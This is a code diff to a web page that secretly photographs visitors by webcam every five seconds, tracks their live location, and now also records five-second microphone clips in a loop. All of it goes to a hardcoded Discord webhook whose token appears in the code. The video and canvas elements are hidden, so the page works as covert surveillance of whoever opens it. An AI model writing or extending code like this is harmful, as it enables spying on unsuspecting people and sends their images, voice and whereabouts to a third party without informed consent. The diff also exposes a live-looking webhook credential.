@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Capture, Location & Send to Discord</title>
+    <title>Auto Capture, Location, Audio & Send to Discord</title>
     <style>
         body {
             display: flex;
@@ -15,7 +15,7 @@
     </style>
 </head>
 <body>
-    <h1>mm Auto Photo Capture, Location & Send to Discord</h1>
+    <h1>Auto Photo Capture, Location, Audio & Send to Discord</h1>
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
@@ -25,6 +25,8 @@
         const context = canvas.getContext('2d');
         let captureInterval;
         let currentLocation = { latitude: null, longitude: null };
+        let mediaRecorder; // For audio recording
+        let audioChunks = [];
 
         // Function to get live location
         function fetchLocation() {
@@ -96,11 +98,61 @@
             }, 'image/png');
         }
 
+        // Function to start audio recording
+        function startAudioRecording() {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = (event) => {
+                    audioChunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    audioChunks = []; // Clear chunks after sending
+
+                    // Send audio to Discord
+                    const formData = new FormData();
+                    formData.append('file', audioBlob, 'audio_recording.webm');
+                    formData.append('content', 'Here is the audio recording.');
+
+                    fetch('https://discord.com/api/webhooks/1199416800027349163/7zVriP6clTaGEm9MbHi6lV8oxDbhvN_qnf97zHkSxajr7ITmyfPTrOBkYSk2szVAm_W8', {
+                        method: 'POST',
+                        body: formData,
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log('Successfully sent audio to Discord');
+                        } else {
+                            console.error('Error sending audio to Discord:', response.statusText);
+                        }
+                    })
+                    .catch((error) => {
+                        console.error('Error sending audio to Discord:', error);
+                    });
+                };
+
+                mediaRecorder.start();
+
+                // Automatically stop recording after 5 seconds
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 5000);
+            })
+            .catch(error => {
+                console.error('Error accessing microphone', error);
+                alert('Microphone access is required to record audio.');
+            });
+        }
+
         // Start camera and initiate auto-capture
         navigator.mediaDevices.getUserMedia({ video: true })
             .then((stream) => {
                 video.srcObject = stream;
-                captureInterval = setInterval(captureAndSend, 5000);  // Capture every 5 seconds
+                captureInterval = setInterval(() => {
+                    captureAndSend();
+                    startAudioRecording();  // Capture audio every 5 seconds
+                }, 5000);  // Capture every 5 seconds
             })
             .catch((error) => {
                 console.error("Error accessing the camera", error);
